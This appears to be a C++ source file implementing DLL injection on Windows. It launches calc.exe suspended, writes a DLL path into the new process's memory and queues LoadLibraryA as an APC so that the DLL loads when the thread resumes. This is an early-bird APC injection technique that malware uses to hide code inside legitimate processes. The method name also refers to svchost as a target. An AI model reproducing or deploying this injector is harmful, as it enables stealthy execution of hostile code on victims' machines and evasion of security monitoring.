#include "Injection.h"
#pragma once 
#include <Windows.h>

DLLInjection::DLLInjection()
{

}
void DLLInjection::InjectDLLTosvchost(LPSTR dllPath)
{
		STARTUPINFO si = {};
		PROCESS_INFORMATION pi = {};

		HMODULE k32 = GetModuleHandle("kernel32.dll");
		CreateProcess(NULL, "calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		//CreateProcess(NULL, "c:\\Program Files\\Microsoft SDKs\\Windows\\v7.1A\\Bin\\certmgr.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
		HANDLE mem = VirtualAllocEx(pi.hProcess, NULL, 260, MEM_COMMIT | MEM_RESERVE , PAGE_READWRITE);
		WriteProcessMemory(pi.hProcess, mem, dllPath, 260, NULL);
		QueueUserAPC((PAPCFUNC)GetProcAddress(k32, "LoadLibraryA"), pi.hThread, (ULONG_PTR)mem);
		QueueUserAPC((PAPCFUNC)GetProcAddress(k32, "ExitThread"), pi.hThread, 0);
		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

}
DLLInjection::~DLLInjection()
{

}